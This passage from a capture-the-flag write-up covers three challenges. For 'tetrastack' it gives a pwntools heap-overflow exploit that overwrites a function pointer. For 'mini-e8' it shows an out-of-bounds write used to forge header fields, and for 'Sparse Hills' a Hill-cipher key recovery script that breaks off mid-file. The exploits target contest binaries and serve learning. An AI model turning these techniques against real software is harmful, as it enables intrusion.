<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">  <span class="n">player</span> <span class="o">=</span> <span class="p">(</span><span class="n">Player</span> <span class="o">*</span><span class="p">)</span><span class="nf">calloc</span><span class="p">(</span><span class="mi">1u</span><span class="p">,</span> <span class="mh">0x10u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">player</span><span class="o">-&gt;</span><span class="n">name_cap</span> <span class="o">=</span> <span class="mi">64</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="n">player</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v4</span><span class="o">-&gt;</span><span class="n">name</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="n">player</span><span class="o">-&gt;</span><span class="n">name_cap</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">callbacks</span> <span class="o">=</span> <span class="p">(</span><span class="n">Callbacks</span> <span class="o">*</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="mh">0x10u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">callbacks</span><span class="o">-&gt;</span><span class="n">on_gameover</span> <span class="o">=</span> <span class="n">real_gameover</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">callbacks</span><span class="o">-&gt;</span><span class="n">on_lineclear</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span></code></pre></div><p>As we can see, the name is on the heap, and immediately after it there is a <code>Callbacks</code> struct that contains two function pointers: <code>on_gameover</code> and <code>on_lineclear</code>.</p>
<h4 id="solution-5">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-5">#</a></h4>
<p>With the help of GDB, I found the precise heap offsets and was able to overwrite the <code>on_gameover</code> function pointer with the address of <code>win</code>.</p>
<h4 id="script-4">Script<a hidden class="anchor" aria-hidden="true" href="#script-4">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python3</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./tetrastack_patched&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;kgx&#39;</span><span class="p">,</span> <span class="s1">&#39;-e&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">conn</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">REMOTE</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;8a0e1141.ctf.ac.upt.ro&#34;</span><span class="p">,</span> <span class="mi">9449</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">elif</span> <span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">path</span><span class="p">,</span> <span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">                                b main
</span></span></span><span class="line"><span class="cl"><span class="s1">                                b set_name
</span></span></span><span class="line"><span class="cl"><span class="s1">                                continue
</span></span></span><span class="line"><span class="cl"><span class="s1">                      &#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">path</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">r</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">wait_menu_or_prompt</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">prompt</span><span class="o">=</span><span class="sa">b</span><span class="s2">&#34;8) Quit&#34;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">chunk</span> <span class="o">=</span> <span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mf">0.5</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">continue</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">+=</span> <span class="n">chunk</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="sa">b</span><span class="s2">&#34;Enter display name length&#34;</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">data</span><span class="p">,</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">prompt</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">data</span><span class="p">,</span> <span class="kc">False</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">reach_game_over</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">max_steps</span><span class="o">=</span><span class="mi">2000</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span><span class="p">,</span> <span class="n">got_prompt</span> <span class="o">=</span> <span class="n">wait_menu_or_prompt</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">got_prompt</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">max_steps</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="p">,</span> <span class="n">got_prompt</span> <span class="o">=</span> <span class="n">wait_menu_or_prompt</span><span class="p">(</span><span class="n">io</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">got_prompt</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Reached name prompt&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span>
</span></span><span class="line"><span class="cl">    <span class="k">raise</span> <span class="ne">RuntimeError</span><span class="p">(</span><span class="s2">&#34;Failed to trigger game over&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span> <span class="o">=</span> <span class="n">conn</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">reach_game_over</span><span class="p">(</span><span class="n">r</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;88&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;bytes:&#39;</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">80</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">win</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">x</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recvall</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">r</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># r.interactive()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
</span></span></code></pre></div><h3 id="mini-e8">mini-e8<a hidden class="anchor" aria-hidden="true" href="#mini-e8">#</a></h3>
<h4 id="analysis-6">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-6">#</a></h4>
<p><code>mini-e8</code> is a small REPL-based ‚Äúengine‚Äù binary. The Engine constructor reads <code>flag.txt</code>, computes a 64‚Äëbyte rolling XOR checksum, XORs that with <code>0x7E3A829F</code>, and stores a 16‚Äëbyte <code>flag_header</code> followed by the flag bytes in an arena pointed to by <code>(QWORD*)Engine + 5</code>. A separate JS‚Äëstyle byte buffer shares this arena <code>in front of</code> the flag_header.</p>
<h5 id="header-layout-little-endian-dwords">Header Layout (little-endian dwords)<a hidden class="anchor" aria-hidden="true" href="#header-layout-little-endian-dwords">#</a></h5>
<pre tabindex="0"><code>flag_header[0] = 0x00000001          # must be forced to 0 for getflag
flag_header[1] = checksum(flag)^0x7E3A829F
flag_header[2] = 0x8BADF00D          # magic constant checked by getflag
flag_header[3] = 0x00000000          # becomes our ‚Äúunlock‚Äù field; needs 42 before second opt
</code></pre><p>Flag bytes start at flag_header + 0x10.</p>
<h5 id="critical-functions">Critical Functions<a hidden class="anchor" aria-hidden="true" href="#critical-functions">#</a></h5>
<ul>
<li>Engine::Engine: Writes flag_header + flag into arena;</li>
<li>compute_checksum(flag): rolling XOR of first 64 bytes then XOR with <code>0x7E3A829F</code>.</li>
<li>cmd_optimize_function (<code>opt</code>): First call enables ‚Äúfast mode‚Äù (writes check capacity). Second call: if <code>flag_header[3] == 42</code>, sets an enable byte at <code>Engine+0x80</code> to 1.</li>
<li>cmd_getflag (<code>getflag</code>) requires:
<ol>
<li>flag_header[2] == 0x8BADF00D</li>
<li>recomputed_checksum ^ 0x7E3A829F == flag_header[1]</li>
<li>flag_header[0] == 0</li>
<li>enable byte at <code>Engine+0x80</code> == 1</li>
</ol>
</li>
</ul>
<h5 id="vulnerability">Vulnerability<a hidden class="anchor" aria-hidden="true" href="#vulnerability">#</a></h5>
<p>In fast mode, <code>write &lt;idx&gt; &lt;val&gt;</code> validates <code>idx &lt; capacity</code> instead of <code>idx &lt; length</code>. Capacity &gt; length, so indices beyond the logical buffer body (&gt;= current length) can include the adjacent flag_header. This gives controlled single‚Äëbyte writes to flag_header fields.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="p">((</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)</span><span class="n">this</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">a2</span> <span class="o">&lt;</span> <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">this</span> <span class="o">+</span> <span class="mi">5</span><span class="p">)</span> <span class="o">||</span> <span class="n">a2</span> <span class="o">&lt;</span> <span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">this</span> <span class="o">+</span> <span class="mi">2</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">result</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">this</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">_BYTE</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">((</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">this</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="o">**</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">**</span><span class="p">)</span><span class="n">this</span> <span class="o">+</span> <span class="n">a2</span><span class="p">)</span> <span class="o">=</span> <span class="n">a3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><h5 id="offsets-mapped-to-header-bytes">Offsets Mapped to Header Bytes<a hidden class="anchor" aria-hidden="true" href="#offsets-mapped-to-header-bytes">#</a></h5>
<p>After first <code>opt</code>, since flag_header is located after the buffer in memory, the following indices (in the REPL) address the flag_header:</p>
<pre tabindex="0"><code>64..67  -&gt; flag_header[0]
68..71  -&gt; flag_header[1]
72..75  -&gt; flag_header[2]
76..79  -&gt; flag_header[3]
</code></pre><p>We only need to change flag_header[0] (set all four bytes to 0) and flag_header[3] (set least significant byte to 42 and clear the rest) before invoking the second <code>opt</code>.</p>
<h4 id="solution-6">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-6">#</a></h4>
<ul>
<li>Run <code>opt</code> once to enter fast (capacity-based) write mode.</li>
<li>Zero <code>flag_header[0]</code> by writing 0 to offsets 64‚Äì67.</li>
<li>Set unlock value: write bytes 76‚Äì79 as <code>42, 0, 0, 0</code> so <code>flag_header[3] == 42</code>.</li>
<li>Run <code>opt</code> again; second optimize sees header[3] == 42 and flips the enable byte.</li>
<li>Call <code>getflag</code>; all conditions now satisfy and it prints the flag from header+0x10.</li>
</ul>
<pre tabindex="0"><code>opt
write 64 0
write 65 0
write 66 0
write 67 0
write 76 42
write 77 0
write 78 0
write 79 0
opt
getflag
</code></pre><h4 id="script-5">Script<a hidden class="anchor" aria-hidden="true" href="#script-5">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">steps</span> <span class="o">=</span> <span class="p">[</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;opt&#34;</span><span class="p">,</span>                <span class="c1"># enter fast path</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;write 64 0&#34;</span><span class="p">,</span>         <span class="c1"># flag_header[0] byte 0</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;write 65 0&#34;</span><span class="p">,</span>         <span class="c1"># flag_header[0] byte 1</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;write 66 0&#34;</span><span class="p">,</span>         <span class="c1"># flag_header[0] byte 2</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;write 67 0&#34;</span><span class="p">,</span>         <span class="c1"># flag_header[0] byte 3</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;write 76 42&#34;</span><span class="p">,</span>        <span class="c1"># flag_header[3] byte 0 -&gt; 42</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;write 77 0&#34;</span><span class="p">,</span>         <span class="c1"># remaining bytes zeroed</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;write 78 0&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;write 79 0&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;opt&#34;</span><span class="p">,</span>                <span class="c1"># second optimize flips enable if header[3]==42</span>
</span></span><span class="line"><span class="cl">    <span class="sa">b</span><span class="s2">&#34;getflag&#34;</span><span class="p">,</span>            <span class="c1"># prints flag if all checks pass</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span></code></pre></div><h2 id="cryptography-">Cryptography üîë<a hidden class="anchor" aria-hidden="true" href="#cryptography-">#</a></h2>
<h3 id="sparse-hills">Sparse Hills<a hidden class="anchor" aria-hidden="true" href="#sparse-hills">#</a></h3>
<h4 id="analysis-7">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis-7">#</a></h4>
<p>We looked at the service as a simple linear cipher over Z_257, where the server computes $c = K m \bmod 257$. The same 257√ó257 key matrix is reused, inputs are zero‚Äëpadded to a full block, and outputs are printed as three‚Äëhex‚Äëdigit numbers. Since the oracle lets us encrypt anything and the mapping is linear, we can reveal the columns of $K$ by encrypting basis vectors. That means we can recover the key and, from there, the flag.</p>
<h4 id="solution-7">Solution<a hidden class="anchor" aria-hidden="true" href="#solution-7">#</a></h4>
<p>I first grab the encrypted flag so we have its ciphertext. Then we encrypt each canonical basis vector,one position set to 1, the rest 0. Each such query returns a column of $K$. When we stack those results, we reconstruct the whole matrix. I invert this matrix modulo 257 using Gauss‚ÄëJordan elimination (Fermat inverses make division easy), multiply the inverse by the flag ciphertext to get the plaintext vector, turn 256 into 0 when converting to bytes, strip the zero padding, and decode as UTF‚Äë8. We need exactly 257 encryptions for recovery, and the inversion is fast at this size.</p>
<h4 id="script-6">Script<a hidden class="anchor" aria-hidden="true" href="#script-6">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">typing</span> <span class="kn">import</span> <span class="n">List</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">P</span> <span class="o">=</span> <span class="mi">257</span>  <span class="c1"># Prime modulus</span>
</span></span><span class="line"><span class="cl"><span class="n">N</span> <span class="o">=</span> <span class="mi">257</span>  <span class="c1"># Block length == dimension</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">recv_until</span><span class="p">(</span><span class="n">sock</span><span class="p">:</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">,</span> <span class="n">marker</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Read from socket until `marker` appears.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">buf</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">marker</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">buf</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">chunk</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4096</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="n">buf</span> <span class="o">+=</span> <span class="n">chunk</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">recv_all</span><span class="p">(</span><span class="n">sock</span><span class="p">:</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bytes</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Read until the socket is closed and return all bytes.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">buf</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">chunk</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">65536</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl">        <span class="n">buf</span> <span class="o">+=</span> <span class="n">chunk</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">HEX3_RE</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="sa">r</span><span class="s2">&#34;^(?:[0-9a-f]</span><span class="si">{3}</span><span class="s2">\s+)</span><span class="si">{256}</span><span class="s2">[0-9a-f]</span><span class="si">{3}</span><span class="s2">$&#34;</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_hex_vector</span><span class="p">(</span><span class="n">blob</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Extract the final 257-entry hex vector from a server response.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">text</span> <span class="o">=</span> <span class="n">blob</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span><span class="o">.</span><span class="n">splitlines</span><span class="p">()):</span>
</span></span><span class="line"><span class="cl">        <span class="n">line</span> <span class="o">=</span> <span class="n">line</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">HEX3_RE</span><span class="o">.</span><span class="n">fullmatch</span><span class="p">(</span><span class="n">line</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="p">[</span><span class="nb">int</span><span class="p">(</span><span class="n">tok</span><span class="p">,</span> <span class="mi">16</span><span class="p">)</span> <span class="k">for</span> <span class="n">tok</span> <span class="ow">in</span> <span class="n">line</span><span class="o">.</span><span class="n">split</span><span class="p">()]</span>
</span></span><span class="line"><span class="cl">    <span class="k">raise</span> <span class="ne">ValueError</span><span class="p">(</span><span class="s2">&#34;Could not find a valid ciphertext line in server output.&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Oracle wrappers</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_encrypted_flag</span><span class="p">(</span><span class="n">host</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">port</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Request option 1 from the server and parse the returned ciphertext.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">recv_until</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;1</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">recv_all</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">parse_hex_vector</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">host</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span> <span class="n">port</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">block</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">List</span><span class="p">[</span><span class="nb">int</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">    <span class="s2">&#34;&#34;&#34;Request option 2 and send a 257-byte block, returning the ciphertext.&#34;&#34;&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">block</span><span class="p">)</span> <span class="o">==</span> <span class="n">N</span><span class="p">,</span> <span class="s2">&#34;block must be exactly N=257 bytes&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">recv_until</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;2</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">recv_until</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&gt; &#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">block</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">recv_all</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">parse_hex_vector</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Modular algebra</span>
</span></span><span class="line"><span class="cl">
